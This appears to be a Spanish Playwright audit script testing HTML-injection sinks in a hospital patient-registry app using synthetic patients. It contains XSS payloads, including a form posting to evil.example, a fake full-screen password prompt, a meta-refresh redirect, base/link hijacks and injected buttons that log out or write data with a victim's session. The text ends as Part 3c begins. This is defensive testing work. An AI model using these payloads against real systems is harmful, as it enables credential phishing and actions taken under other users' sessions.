// Evidencia Fase 3 (auditoría del cliente) — A2: sumideros de HTML reproducidos en Chromium contra el servidor real.
// Solo datos inventados (DNI 96…) y la semilla de 20 pacientes simulados. Las claves salen del entorno.
// Uso: ADMIN_PASSWORD=<clave> BASE=http://127.0.0.1:3261 node A2_sumideros_navegador.js   (ver ../f4/srv.sh)
//
// Qué hace:
//  Parte 1 (alcance REAL, por la API): crea un paciente por campo con la carga «"'><u id="xss_CAMPO">ZZ</u>», anota si el
//          servidor la rechaza o la guarda, e inicia sesión para ver en 6 pantallas (lista, tooltip, popup, ficha, tablero,
//          registro clínico) si aparece un ELEMENTO inyectado (#xss_CAMPO), el texto literal o nada.
//  Parte 2 (defensa en profundidad, EN MEMORIA): el mismo recorrido con todos los campos hostiles puestos directamente en
//          window.app.setPatients(), sin pasar por el servidor. Responde «si el servidor dejara pasar el dato, ¿el cliente
//          lo escapa?».
//  Parte 3: consecuencias de una inyección de HTML con la CSP actual (script bloqueado, pero ¿qué sí se puede hacer?),
//          la lista cerrada de acciones.js, el pin de búsqueda (autoinyección), usuarios con nombre hostil, eventos
//          hostiles, un Excel hostil por la cuadrícula, CSV de pre-citas y Excel exportado con fórmulas.
const { chromium } = require('playwright');
const fs = require('fs');
const os = require('os');
const path = require('path');
const RAIZ = path.resolve(__dirname, '../../../..');
const BASE = process.env.BASE || 'http://127.0.0.1:3261';
const sleep = ms => new Promise(r => setTimeout(r, ms));
const out = [];
const log = (s = '') => { out.push(s); console.log(s); };
const XLSX = require(path.join(RAIZ, 'client/libs/xlsx.full.min.js'));
const exp = require(path.join(RAIZ, 'client/js/data/padronExportV4.js'));

const H = 'Hospital de Apoyo Huarmey (00001741, II-1)';
const PAY = k => `"'><u id="xss_${k}">ZZ</u>`;
const PAY_TXT = k => `<u id="xss_${k}">`;
const CLAVE = 'Clave-de-prueba-C3-1';

async function api(method, url, token, body) {
  const h = {};
  if (token) h.Authorization = 'Bearer ' + token;
  if (body !== undefined) h['Content-Type'] = 'application/json';
  for (let i = 0; i < 4; i++) {
    const r = await fetch(BASE + url, { method, headers: h, body: body === undefined ? undefined : JSON.stringify(body) });
    if (r.status === 429) { await sleep(8000); continue; }
    const t = await r.text(); let j = null; try { j = JSON.parse(t); } catch (e) { /* */ }
    return { status: r.status, json: j, text: t };
  }
  return { status: 429, json: null, text: '' };
}

async function abrir(browser, usuario, clave, opciones = {}) {
  const ctx = await browser.newContext({ viewport: opciones.viewport || { width: 1366, height: 800 }, acceptDownloads: true });
  const page = await ctx.newPage();
  page.setDefaultTimeout(10000);
  page.dialogos = [];
  page.on('dialog', d => { page.dialogos.push(d.message()); d.accept(); });
  page.csp = [];
  page.errores = [];
  page.on('pageerror', e => page.errores.push(e.message.split('\n')[0]));
  await page.addInitScript(() => {
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', e => window.__csp.push(`${e.violatedDirective} ${String(e.blockedURI).slice(0, 40)}`));
  });
  await page.goto(BASE + '/');
  await page.waitForSelector('#login-overlay.active');
  await page.fill('#login-username', usuario);
  await page.fill('#login-password', clave);
  await page.click('#login-submit');
  await page.waitForFunction(() => !document.getElementById('login-overlay').classList.contains('active'));
  await sleep(1500);
  return { ctx, page };
}

// ---- Campos probados ----
// Texto o claves que el cliente pinta. «tipo» solo documenta de qué lado se espera la defensa.
const TOP = ['direccion', 'historia_clinica', 'telefono', 'sector_sanitario', 'sector', 'financiador', 'seguro_salud', 'seguro', 'tipo_documento',
  'establecimiento_adscripcion', 'establecimiento_control', 'puerta_entrada', 'estado_control', 'diagnostico_nutricional', 'riesgo_cv', 'dano_organo_blanco',
  'otras_patologias', 'tratamiento_hta', 'tratamiento_dm', 'estado_empadronamiento', 'observacion', 'observaciones', 'nota_duplicado_padron', 'hba1c_texto',
  'peso', 'talla', 'imc', 'pab', 'creatinina', 'microalbumina', 'depuracion_creatinina', 'colesterol_total', 'colesterol_ldl', 'colesterol_hdl', 'trigliceridos',
  'edad', 'frecuencia_hearts', 'fila_excel', 'dias_restantes', 'dias_vencido', 'fecha_examenes', 'fecha_estado', 'pas_ene', 'pad_ene', 'pas_oct', 'pad_oct',
  'glucosa', 'hba1c', 'pa_sistolica', 'pa_diastolica', 'estatina', 'aspirina_aas', 'meses_medicacion', 'estado_paciente', 'semaforo', 'sexo',
  'apellidos_nombres', 'fecha_nacimiento', 'consentimiento', 'actualizado_por', 'dx_confirmado', 'enfermedad_cardiovascular'];
const NESTED = ['conditions.cie10_cod', 'conditions.diagnostico', 'diagnosticos.0', 'observations.estado_control', 'appointments.estado'];
const CAMPOS = TOP.concat(NESTED);
const idDe = k => k.replace(/[^A-Za-z0-9_]/g, '_');

function pacienteBase(dni, idx, extra) {
  const p = {
    id: 'pac-00001741-' + dni, dni, apellidos_nombres: 'PACIENTE C3 ' + idx, historia_clinica: 'HC' + dni, sexo: 'F', fecha_nacimiento: '1960-05-10',
    telefono: '943000' + String(idx).padStart(3, '0'), direccion: 'Jr. Bolognesi 250 Huarmey', sector_sanitario: 'Sector 01 - Centro Urbano',
    establecimiento_adscripcion: H, establecimiento_control: H, latitud: -10.0478 + (idx % 10) * 0.0004, longitud: -78.1548 + Math.floor(idx / 10) * 0.0004,
    consentimiento: 'Sí, firmado', observations: [{ fecha_registro: '2026-10-20', pa_sistolica: 150, pa_diastolica: 95, estado_control: 'No Controlado' }],
    appointments: [{ fecha_cita: '2026-12-01', estado: 'booked' }], conditions: [{ cie10_cod: 'I10.X', diagnostico: 'Hipertensión Arterial' }], diagnosticos: ['I10.X']
  };
  return Object.assign(p, extra || {});
}

// Pone la carga hostil en el campo k (ruta con puntos para los anidados)
function conCarga(p, k) {
  const carga = PAY(idDe(k));
  const [a, b] = k.split('.');
  if (b === undefined) { p[a] = carga; return p; }
  if (a === 'diagnosticos') { p.diagnosticos = [carga]; return p; }
  p[a] = [Object.assign({}, p[a][0], { [b]: carga })];
  return p;
}

// ---- Lectura de pantallas (se ejecuta dentro de la página) ----
const IDS_EN = `(sel) => {
  const raiz = sel ? document.querySelector(sel) : document.body;
  if (!raiz) return [];
  return [...raiz.querySelectorAll('[id]')].map(e => e.id).filter(i => /^xss_/i.test(i));
}`;
const LITERAL_EN = `(sel) => {
  const raiz = sel ? document.querySelector(sel) : document.body;
  if (!raiz) return [];
  const txt = raiz.textContent;
  const attrs = [...raiz.querySelectorAll('*')].flatMap(el => [...el.attributes].map(a => a.value));
  const hallados = new Set();
  for (const m of (txt + ' ' + attrs.join(' ')).matchAll(/<u id="(xss_[A-Za-z0-9_]+)">/g)) hallados.add(m[1]);
  return [...hallados];
}`;

async function superficies(page, patients, etiqueta) {
  // Devuelve {superficie: {ids: Set, literales: Set}}
  const res = { lista: [], tooltip: [], popup: [], ficha: [], tablero: [], registro: [] };
  const lit = { lista: [], tooltip: [], popup: [], ficha: [], tablero: [], registro: [] };
  await page.evaluate(() => { window.app.switchView('mapa'); window.app.visibleLimit = 5000; window.app.render(); });
  await sleep(400);
  // lista
  res.lista = await page.evaluate(`(${IDS_EN})('#patient-list')`);
  lit.lista = await page.evaluate(`(${LITERAL_EN})('#patient-list')`);
  // tooltips: se abre cada uno y se lee lo que Leaflet pintó
  const tt = await page.evaluate(`(async () => {
    const ids = new Set(), lits = new Set();
    const ms = []; window.app.mapManager.layers.pacientes.eachLayer(l => ms.push(l));
    for (const m of ms) { m.openTooltip(); }
    const nodos = [...document.querySelectorAll('.leaflet-tooltip')];
    for (const n of nodos) {
      n.querySelectorAll('[id]').forEach(e => { if (/^xss_/i.test(e.id)) ids.add(e.id); });
      for (const x of (n.textContent + ' ' + [...n.querySelectorAll('*')].flatMap(e => [...e.attributes].map(a => a.value)).join(' ')).matchAll(/<u id="(xss_[A-Za-z0-9_]+)">/g)) lits.add(x[1]);
    }
    for (const m of ms) m.closeTooltip();
    return { ids: [...ids], lits: [...lits], marcadores: ms.length };
  })()`);
  res.tooltip = tt.ids; lit.tooltip = tt.lits; res.marcadores = tt.marcadores;
  // popups: uno por uno (Leaflet mantiene un solo popup abierto)
  const pp = await page.evaluate(`(async () => {
    const ids = new Set(), lits = new Set();
    const ms = []; window.app.mapManager.layers.pacientes.eachLayer(l => ms.push(l));
    for (const m of ms) {
      m.openPopup();
      document.querySelectorAll('.leaflet-popup').forEach(n => {
        n.querySelectorAll('[id]').forEach(e => { if (/^xss_/i.test(e.id)) ids.add(e.id); });
        for (const x of (n.textContent + ' ' + [...n.querySelectorAll('*')].flatMap(e => [...e.attributes].map(a => a.value)).join(' ')).matchAll(/<u id="(xss_[A-Za-z0-9_]+)">/g)) lits.add(x[1]);
      });
      m.closePopup();
    }
    return { ids: [...ids], lits: [...lits] };
  })()`);
  res.popup = pp.ids; lit.popup = pp.lits;
  // ficha: una por paciente
  const ff = await page.evaluate(`(async () => {
    const lista = ${JSON.stringify(patients.map(p => p.id))};
    const ids = new Set(), lits = new Set();
    for (const id of lista) {
      window.app.openPatientDetail(id);
      await new Promise(r => setTimeout(r, 120));
      const n = document.getElementById('modal-patient-detail');
      if (!n) continue;
      n.querySelectorAll('[id]').forEach(e => { if (/^xss_/i.test(e.id)) ids.add(e.id); });
      for (const x of (n.textContent + ' ' + [...n.querySelectorAll('*')].flatMap(e => [...e.attributes].map(a => a.value)).join(' ')).matchAll(/<u id="(xss_[A-Za-z0-9_]+)">/g)) lits.add(x[1]);
    }
    const n = document.getElementById('modal-patient-detail'); if (n) n.classList.remove('active');
    return { ids: [...ids], lits: [...lits] };
  })()`);
  res.ficha = ff.ids; lit.ficha = ff.lits;
  // tablero
  await page.evaluate(() => { window.app.switchView('dashboard'); window.app.renderDashboard(); });
  await sleep(600);
  res.tablero = await page.evaluate(`(${IDS_EN})('#view-dashboard')`);
  lit.tablero = await page.evaluate(`(${LITERAL_EN})('#view-dashboard')`);
  await page.evaluate(() => window.app.switchView('mapa'));
  // registro clínico: se abre con el documento de cada paciente
  const rg = await page.evaluate(`(async () => {
    const ids = new Set(), lits = new Set();
    const lista = ${JSON.stringify(patients.map(p => p.dni))};
    for (const dni of lista) {
      window.RegistroClinicoModal.open(dni);
      await new Promise(r => setTimeout(r, 100));
      const n = document.getElementById('modal-registro-clinico');
      if (!n) continue;
      n.querySelectorAll('[id]').forEach(e => { if (/^xss_/i.test(e.id)) ids.add(e.id); });
      const vals = [...n.querySelectorAll('input,select,textarea')].map(e => e.value).join(' ');
      for (const x of (n.textContent + ' ' + vals + ' ' + [...n.querySelectorAll('*')].flatMap(e => [...e.attributes].map(a => a.value)).join(' ')).matchAll(/<u id="(xss_[A-Za-z0-9_]+)">/g)) lits.add(x[1]);
    }
    const n = document.getElementById('modal-registro-clinico'); if (n) n.classList.remove('active');
    return { ids: [...ids], lits: [...lits] };
  })()`);
  res.registro = rg.ids; lit.registro = rg.lits;
  return { res, lit };
}

function tabla(campos, S) {
  const filas = [];
  const sup = ['lista', 'tooltip', 'popup', 'ficha', 'tablero', 'registro'];
  for (const k of campos) {
    const id = 'xss_' + idDe(k);
    const celdas = sup.map(s => {
      const hay = S.res[s].some(x => x.toLowerCase() === id.toLowerCase());
      if (hay) return 'ELEMENTO';
      const l = S.lit[s].some(x => x.toLowerCase() === id.toLowerCase());
      return l ? 'literal' : '-';
    });
    filas.push({ k, celdas });
  }
  return { sup, filas };
}

(async () => {
  const A = (await api('POST', '/api/auth/login', null, { username: 'admin', password: process.env.ADMIN_PASSWORD })).json.token;
  log('A2 — sumideros de HTML en Chromium · servidor ' + BASE.replace(/\d+\.\d+\.\d+\.\d+/, '127.0.0.1'));
  log('Chromium ' + (await (async () => { const b = await chromium.launch(); const v = b.version(); await b.close(); return v; })()));
  log('CSP del servidor: ' + ((await fetch(BASE + '/')).headers.get('content-security-policy') || ''));

  // =====================================================================================
  log('\n=== PARTE 1 — alcance real: un paciente por campo, cargado por /api/padron/importar-lote (ADMIN) ===');
  const veredictoServidor = {};
  const subidos = [];
  let n = 0;
  for (const k of CAMPOS) {
    n++;
    const dni = '96' + String(100000 + n);
    const p = conCarga(pacienteBase(dni, n), k);
    // el campo probado pisa al valor base; los anidados ya quedaron reemplazados
    const r = await api('POST', '/api/padron/importar-lote', A, { patients: [p] });
    veredictoServidor[k] = r.status === 200 ? 'ACEPTA' : `RECHAZA ${r.status}`;
    if (r.status === 200) subidos.push({ k, dni, id: p.id });
  }
  const guardados = (await api('GET', '/api/cronicos', A)).json;
  const almacen = {};
  for (const s of subidos) {
    const g = guardados.find(x => x.dni === s.dni);
    const [a, b] = s.k.split('.');
    let v;
    if (!g) v = '(no está)';
    else if (b === undefined) v = g[a];
    else if (a === 'diagnosticos') v = (g.diagnosticos || [])[0];
    else v = ((g[a] || [])[0] || {})[b];
    const crudo = JSON.stringify(v === undefined ? null : v);
    almacen[s.k] = v === undefined ? 'DESCARTADO' : (typeof v === 'string' && v.includes(PAY_TXT(idDe(s.k))) ? 'GUARDADO TAL CUAL' : (v === null ? 'null' : 'TRANSFORMADO ' + crudo.slice(0, 40)));
  }
  log('\nCampo | servidor | lo que quedó guardado');
  for (const k of CAMPOS) log(`${k.padEnd(30)} | ${veredictoServidor[k].padEnd(11)} | ${veredictoServidor[k] === 'ACEPTA' ? almacen[k] : '-'}`);

  const browser = await chromium.launch();
  const { page } = await abrir(browser, 'admin', process.env.ADMIN_PASSWORD);
  const reales = await page.evaluate(() => window.app.patients.filter(p => /^96\d{6}$/.test(p.dni)).map(p => ({ id: p.id, dni: p.dni })));
  log(`\nPacientes hostiles cargados en la sesión del ADMIN: ${reales.length}`);
  const S1 = await superficies(page, reales, 'api');
  log(`Marcadores en el mapa: ${S1.res.marcadores}`);
  const T1 = tabla(CAMPOS.filter(k => veredictoServidor[k] === 'ACEPTA'), S1);
  log('\nCampo (aceptado por el servidor) | ' + T1.sup.join(' | ') + '   [ELEMENTO = se inyectó un elemento; literal = se ve el texto; - = no se muestra]');
  const inyectados1 = [];
  for (const f of T1.filas) {
    log(`${f.k.padEnd(30)} | ${f.celdas.map(c => c.padEnd(8)).join(' | ')}`);
    if (f.celdas.includes('ELEMENTO')) inyectados1.push(f.k + ' → ' + T1.sup.filter((s, i) => f.celdas[i] === 'ELEMENTO').join(', '));
  }
  log('\nPARTE 1 — campos que llegan a ser ELEMENTO inyectado por la ruta real: ' + (inyectados1.length ? '\n  ' + inyectados1.join('\n  ') : 'ninguno'));
  const ids1 = [...new Set([].concat(...Object.values(S1.res).filter(Array.isArray)))];
  log('Violaciones de CSP en la sesión: ' + JSON.stringify(await page.evaluate(() => window.__csp)));

  // =====================================================================================
  log('\n=== PARTE 2 — defensa en profundidad: todos los campos hostiles puestos EN MEMORIA (sin pasar por el servidor) ===');
  const todos = pacienteBase('96900001', 900, { id: 'pac-mem-1', latitud: -10.0478, longitud: -78.1548 });
  for (const k of TOP) {
    if (['id', 'dni', 'semaforo', 'dias_restantes', 'dias_vencido', 'fecha_limite'].includes(k)) continue;
    todos[k] = PAY(idDe(k));
  }
  todos.dni = '96900001'; todos.id = 'pac-mem-1'; todos.fuente = 'PADRON'; todos.fallecido = false;
  todos.conditions = [{ cie10_cod: PAY('conditions_cie10_cod'), diagnostico: PAY('conditions_diagnostico') }];
  todos.diagnosticos = [PAY('diagnosticos_0')];
  todos.observations = [{ fecha_registro: '2026-10-20', pa_sistolica: 150, pa_diastolica: 95, estado_control: PAY('observations_estado_control') }];
  todos.appointments = [{ fecha_cita: '2026-12-01', estado: PAY('appointments_estado') }];
  todos.pa_sistolica = 150; todos.pa_diastolica = 95; // numéricos reales para ver el resto de la tarjeta
  todos.telefono = '943000900';
  // un segundo paciente con id y documento hostiles (se usan en data-arg, aria-label, URLs)
  const idHostil = {
    id: PAY('id'), dni: PAY('dni'), apellidos_nombres: PAY('nombre_id'), historia_clinica: 'HC', sexo: 'F', latitud: -10.0479, longitud: -78.1549, telefono: '943000901',
    direccion: 'Jr. Bolognesi 250', puerta_entrada: PAY('pe_id'), diagnosticos: ['I10.X'], conditions: [], observations: [], appointments: [{ fecha_cita: '2026-12-01', estado: 'booked' }]
  };
  await page.evaluate(([a, b]) => { window.app.setPatients([a, b]); window.app.render(); }, [todos, idHostil]);
  await sleep(600);
  const S2 = await superficies(page, [todos], 'mem');
  const clavesMem = TOP.filter(k => !['id', 'dni', 'semaforo', 'dias_restantes', 'dias_vencido'].includes(k)).concat(NESTED);
  const T2 = tabla(clavesMem, S2);
  log('\nCampo | ' + T2.sup.join(' | '));
  const inyectados2 = [];
  const literales2 = [];
  const nunca = [];
  for (const f of T2.filas) {
    const v = f.celdas.some(c => c !== '-');
    log(`${f.k.padEnd(30)} | ${f.celdas.map(c => c.padEnd(8)).join(' | ')}`);
    if (f.celdas.includes('ELEMENTO')) inyectados2.push(f.k + ' → ' + T2.sup.filter((s, i) => f.celdas[i] === 'ELEMENTO').join(', '));
    else if (v) literales2.push(f.k);
    else nunca.push(f.k);
  }
  log('\nPARTE 2 — campos que producen ELEMENTO inyectado aunque el servidor los dejara pasar: ' + (inyectados2.length ? '\n  ' + inyectados2.join('\n  ') : 'ninguno'));
  log(`Campos que se muestran escapados (texto literal): ${literales2.length}`);
  log(`Campos que ninguna pantalla muestra: ${nunca.length} (${nunca.join(', ')})`);

  // id / documento hostiles (se limpia el DOM antes para no contaminar la cuenta)
  await page.evaluate(() => { const m = document.getElementById('modal-patient-detail'); if (m) m.remove(); const r = document.getElementById('reference-inspector-card'); if (r) r.remove(); window.app.setPatients([window.app.patients.find(p => String(p.id).includes('xss_id'))].filter(Boolean)); window.app.render(); });
  const idRes = await page.evaluate(`(async () => {
    const p = window.app.patients[0];
    const out = { ids: [], pacientes: window.app.patients.length };
    window.app.visibleLimit = 5000; window.app.render();
    window.app.openPatientDetail(p.id);
    await new Promise(r => setTimeout(r, 200));
    const hallar = (n) => { n.querySelectorAll('[id]').forEach(e => { if (/^xss_/i.test(e.id)) out.ids.push(e.id); }); };
    hallar(document.getElementById('patient-list')); hallar(document.getElementById('modal-patient-detail'));
    window.app.mapManager.layers.pacientes.eachLayer(m => { m.openPopup(); document.querySelectorAll('.leaflet-popup').forEach(hallar); m.openTooltip(); document.querySelectorAll('.leaflet-tooltip').forEach(hallar); });
    out.dataArg = [...document.querySelectorAll('[data-arg]')].filter(e => /xss_/i.test(e.getAttribute('data-arg'))).length;
    out.atributosExtra = [...document.querySelectorAll('[data-arg]')].filter(e => /xss_/i.test(e.getAttribute('data-arg'))).map(e => e.getAttributeNames().join('+')).slice(0, 3);
    out.acciones = [...new Set([...document.querySelectorAll('[data-accion]')].filter(e => /xss_/i.test(e.getAttribute('data-arg') || '')).map(e => e.getAttribute('data-accion')))];
    return out;
  })()`);
  log(`\nid, documento, nombre y puerta de entrada hostiles (lista, ficha, popup, tooltip; ${idRes.pacientes} paciente): elementos inyectados = ${idRes.ids.length}; botones con data-arg hostil = ${idRes.dataArg} (acciones: ${idRes.acciones.join(', ')}); atributos de esos botones: ${JSON.stringify(idRes.atributosExtra)} (el valor entra como texto del atributo, sin atributos nuevos)`);

  // variantes de la ficha que solo se pintan con otro estado: fallecido y brecha HOSIX
  const fallecido = pacienteBase('96900002', 902, { id: 'pac-mem-2', fallecido: true, fecha_estado: PAY('fecha_estado'), observacion: PAY('observacion_fallecido'), latitud: -10.0480, longitud: -78.1550 });
  const hosix = pacienteBase('96900003', 903, { id: 'pac-mem-3', fuente: 'HOSIX', observacion: PAY('observacion_hosix'), puerta_entrada: PAY('pe_hosix'), latitud: -10.0481, longitud: -78.1551 });
  await page.evaluate(([a, b]) => { window.app.setPatients([a, b]); window.app.render(); }, [fallecido, hosix]);
  await sleep(300);
  const var1 = await page.evaluate(`(async () => {
    const out = { ids: [], lits: [] };
    for (const id of ['pac-mem-2', 'pac-mem-3']) {
      window.app.openPatientDetail(id);
      await new Promise(r => setTimeout(r, 150));
      const n = document.getElementById('modal-patient-detail');
      n.querySelectorAll('[id]').forEach(e => { if (/^xss_/i.test(e.id)) out.ids.push(id + ':' + e.id); });
      for (const x of n.textContent.matchAll(/<u id="(xss_[A-Za-z0-9_]+)">/g)) out.lits.push(id + ':' + x[1]);
    }
    return out;
  })()`);
  log(`Fallecido y HOSIX (ficha): elementos inyectados = ${JSON.stringify(var1.ids)}; escapados (texto) = ${JSON.stringify(var1.lits)}`);

  // =====================================================================================
  log('\n=== PARTE 3a — qué se puede hacer con un elemento inyectado (nota_duplicado_padron, lo único que llega por la API) ===');
  await api('POST', '/api/users', A, { username: 'c3.coord', nombre: '<img src=x id=xss_user_nombre>"\'`>', correo: 'c3.coord@prueba.example', role: 'COORDINADOR', red: '156', password: CLAVE });
  await api('POST', '/api/users', A, { username: 'c3.dir', nombre: '<img src=x id=xss_user_nombre_dir>', correo: 'c3.dir@prueba.example', role: 'DIRECTOR', red: '156', password: CLAVE });
  await api('POST', '/api/users', A, { username: 'c3.coord2', nombre: 'Coordinadora de prueba dos', correo: 'c3.coord2@prueba.example', role: 'COORDINADOR', red: '156', password: CLAVE });
  const C = (await api('POST', '/api/auth/login', null, { username: 'c3.coord', password: CLAVE })).json.token;
  const cargaFuerte = [
    '<img src=x id="xss_n_img" onerror="window.__pwn=1">',
    '<button id="xss_n_btn" data-accion="clicEn" data-arg="btn-logout">Confirmar</button>',
    '<button id="xss_n_btn2" data-accion="quitarElemento" data-arg="map">Aceptar</button>',
    '<a id="xss_n_a" href="https://evil.example/login">Haga clic aquí</a>',
    '<form id="xss_n_form" action="https://evil.example/c" method="post"><input name="x"><button>Enviar</button></form>',
    '<iframe id="xss_n_ifr" src="https://evil.example/"></iframe>',
    '<style id="xss_n_style">#patient-list{outline:5px solid red}</style>',
    '<base id="xss_n_base" href="https://evil.example/">',
    '<link id="xss_n_link" rel="stylesheet" href="https://evil.example/x.css">',
    '<svg id="xss_n_svg" onload="window.__pwn=2"></svg>',
    '<div id="xss_n_div" style="position:fixed;inset:0;background:#fff;z-index:99999">Sesión vencida: escriba su clave</div>'
  ].join('');
  const r3 = await api('POST', '/api/padron/importar-lote', C, { patients: [pacienteBase('96800001', 800, { nota_duplicado_padron: cargaFuerte })] });
  log(`COORDINADOR (red Pacífico Sur) carga por API un paciente con nota_duplicado_padron hostil: HTTP ${r3.status}`);
  // La víctima: otro usuario (ADMIN) abre la ficha de ese paciente
  const v = await abrir(browser, 'admin', process.env.ADMIN_PASSWORD);
  await v.page.evaluate(() => { window.app.openPatientDetail('pac-00001741-96800001'); });
  await sleep(600);
  const efectos = await v.page.evaluate(() => {
    const q = id => !!document.getElementById(id);
    return {
      img: q('xss_n_img'), btn: q('xss_n_btn'), btn2: q('xss_n_btn2'), a: q('xss_n_a'), form: q('xss_n_form'), ifr: q('xss_n_ifr'), style: q('xss_n_style'),
      base: q('xss_n_base'), link: q('xss_n_link'), svg: q('xss_n_svg'), div: q('xss_n_div'),
      pwn: window.__pwn === undefined ? 'no ejecutado' : 'EJECUTADO ' + window.__pwn,
      csp: window.__csp.slice(0, 12),
      baseUri: document.baseURI,
      outline: getComputedStyle(document.getElementById('patient-list')).outlineStyle
    };
  });
  log('Elementos presentes en la ficha de la víctima (ADMIN): ' + JSON.stringify(efectos, null, 0));
  const hacia = await v.page.evaluate(() => { const a = document.getElementById('xss_n_a'); return a ? a.href : null; });
  log(`Enlace inyectado visible y clicable: ${hacia}`);
  await v.ctx.close();
  // acción de la lista cerrada disparada por un botón inyectado: la víctima es otra COORDINADORA (el cierre de sesión revoca sus sesiones)
  const w = await abrir(browser, 'c3.coord2', CLAVE);
  await w.page.evaluate(() => window.app.openPatientDetail('pac-00001741-96800001'));
  await sleep(600);
  const cubre = await w.page.evaluate(() => { const e = document.elementFromPoint(window.innerWidth / 2, window.innerHeight / 2); return e ? (e.id || e.tagName) : null; });
  log(`Elemento que recibe un clic físico en el centro de la pantalla: #${cubre} (el div inyectado a pantalla completa tapa la aplicación: suplantación visual)`);
  const antes = await w.page.evaluate(() => document.getElementById('login-overlay').classList.contains('active'));
  await w.page.evaluate(() => document.getElementById('xss_n_btn').click());
  await sleep(900);
  const despues = await w.page.evaluate(() => ({ login: document.getElementById('login-overlay').classList.contains('active'), tok: sessionStorage.getItem('maxime_cronicos_sesion_v1') }));
  log(`Clic en el botón inyectado (data-accion="clicEn" data-arg="btn-logout"): sesión cerrada = ${despues.login && !despues.tok} (antes: pantalla de acceso visible = ${antes})`);
  await w.ctx.close();

  // un botón inyectado que ejecuta una acción de ESCRITURA de la lista cerrada con la sesión de la víctima (confirmarPreCita)
  await api('POST', '/api/padron/importar-lote', C, { patients: [pacienteBase('96800005', 805, { nota_duplicado_padron: '<button id="xss_n_precita" data-accion="confirmarPreCita">Cerrar</button>' })] });
  const contarPre = async () => ((await api('GET', '/api/patients/pac-00001741-96800005/eventos', A)).json.eventos || []).filter(e => e.estado === 'pre-cita').length;
  const antesPre = await contarPre();
  const w2 = await abrir(browser, 'c3.coord2', CLAVE);
  await w2.page.evaluate(() => window.app.openPatientDetail('pac-00001741-96800005'));
  await sleep(500);
  await w2.page.evaluate(() => document.getElementById('xss_n_precita').click());
  await sleep(1500);
  const despuesPre = await contarPre();
  log(`Botón inyectado «Cerrar» con data-accion="confirmarPreCita": pre-citas del paciente antes = ${antesPre}, después del clic de la víctima (COORDINADORA) = ${despuesPre} (se escribió en el servidor con su sesión, sin ejecutar ningún script)`);
  await w2.ctx.close();

  // meta refresh inyectada: navegación forzada
  await api('POST', '/api/padron/importar-lote', C, { patients: [pacienteBase('96800002', 801, { nota_duplicado_padron: `<meta id="xss_n_meta" http-equiv="refresh" content="0;url=${BASE}/destino-inyectado-c3">` })] });
  const v2 = await abrir(browser, 'admin', process.env.ADMIN_PASSWORD);
  let navegado = 'no';
  v2.page.on('framenavigated', f => { if (f === v2.page.mainFrame() && f.url().includes('destino-inyectado-c3')) navegado = 'SÍ → ' + f.url().replace(/\d+\.\d+\.\d+\.\d+:\d+/, '127.0.0.1:PUERTO'); });
  await v2.page.evaluate(() => window.app.openPatientDetail('pac-00001741-96800002'));
  await sleep(2500);
  log(`<meta http-equiv="refresh"> inyectado: navegación forzada fuera de la aplicación = ${navegado}`);
  await v2.ctx.close();

  // Un script en línea sí quedaría bloqueado: se comprueba con una ficha y registrando las violaciones
  log('Resumen de la CSP: script en línea y manejadores bloqueados = ' + (efectos.pwn === 'no ejecutado') + `; violaciones registradas: ${efectos.csp.length}`);

  // =====================================================================================
  log('\n=== PARTE 3b — acciones.js: ¿se puede invocar algo fuera de la lista cerrada? ===');
  const acc = await page.evaluate(() => {
    const llamadas = [];
    const errores = [];
    window.addEventListener('error', e => errores.push(e.message));
    const app = window.app;
    const original = { switchView: app.switchView, selectRis: app.selectRis, enviarWhatsApp: app.enviarWhatsApp };
    app.switchView = a => llamadas.push('switchView:' + a);
    app.selectRis = a => llamadas.push('selectRis:' + a);
    app.enviarWhatsApp = a => llamadas.push('enviarWhatsApp:' + a);
    const probar = (nombre, arg, tipo) => {
      const b = document.createElement('button');
      b.setAttribute(tipo === 'cambio' ? 'data-cambio' : 'data-accion', nombre);
      if (arg !== undefined) b.setAttribute('data-arg', arg);
      document.body.appendChild(b);
      b.click();
      if (tipo === 'cambio') b.dispatchEvent(new Event('change', { bubbles: true }));
      b.remove();
    };
    const fuera = ['__proto__', 'constructor', 'toString', 'valueOf', 'hasOwnProperty', 'eval', 'Function', 'alert', 'app.logout', 'switchView ', 'SWITCHVIEW', 'switchView;alert(1)',
      "switchView')+alert(1)+('", 'window.app.limpiarSesion', 'limpiarSesion', 'authFetch', 'session.logout', 'prototype', '__defineGetter__'];
    window.__sentinel = 0;
    for (const f of fuera) { probar(f, '1'); probar(f, '1', 'cambio'); }
    const sinEfecto = llamadas.length === 0;
    // los argumentos con comillas, backticks y marcas llegan como texto
    probar('switchView', `"'\`);alert(1);//<u id=x>`);
    probar('selectRis', `156'); window.__sentinel=1;//`);
    probar('enviarWhatsApp', '${window.__sentinel=2}');
    Object.assign(app, original);
    return { llamadasFuera: sinEfecto, dentro: llamadas, sentinel: window.__sentinel, errores, listas: { clic: window.AccionesUi.clic.length, cambio: window.AccionesUi.cambio.length } };
  });
  log(`${acc.listas.clic} acciones de clic y ${acc.listas.cambio} de cambio en la lista. Nombres ajenos probados (19, en clic y en cambio): llamadas a métodos = ${acc.llamadasFuera ? 0 : 'ALGUNA'}; errores = ${acc.errores.length}`);
  log(`Argumentos con comillas/backtick/${'${'}…} dentro de la lista llegan como texto: ${JSON.stringify(acc.dentro)}; variable centinela (código ejecutado) = ${acc.sentinel}`);
  // Cobertura: toda acción que aparece en plantillas e index.html está en la lista
  const html = fs.readFileSync(path.join(RAIZ, 'client/index.html'), 'utf8');
  const plantillas = ['client/js/main.js', 'client/js/map/mapManager.js'].map(f => fs.readFileSync(path.join(RAIZ, f), 'utf8')).join('\n');
  const usadas = new Set([...(html + plantillas).matchAll(/data-accion="([^"]+)"/g)].map(m => m[1]));
  const usadasCambio = new Set([...(html + plantillas).matchAll(/data-cambio="([^"]+)"/g)].map(m => m[1]));
  const listaClic = await page.evaluate(() => window.AccionesUi.clic);
  const listaCambio = await page.evaluate(() => window.AccionesUi.cambio);
  log(`data-accion usadas en index.html y plantillas: ${usadas.size}; fuera de la lista: ${[...usadas].filter(x => !listaClic.includes(x)).join(', ') || 'ninguna'}; en la lista sin uso: ${listaClic.filter(x => !usadas.has(x)).join(', ') || 'ninguna'}`);
  log(`data-cambio usadas: ${usadasCambio.size}; fuera de la lista: ${[...usadasCambio].filter(x => !listaCambio.includes(x)).join(', ') || 'ninguna'}`);

  // =====================================================================================
  log('\n=== PARTE 3c — pin de búsqueda del mapa (mapManager.js:1096, autoinyección) ===');
  await page.evaluate(() => { window.app.setPatients([]); window.app.render(); });
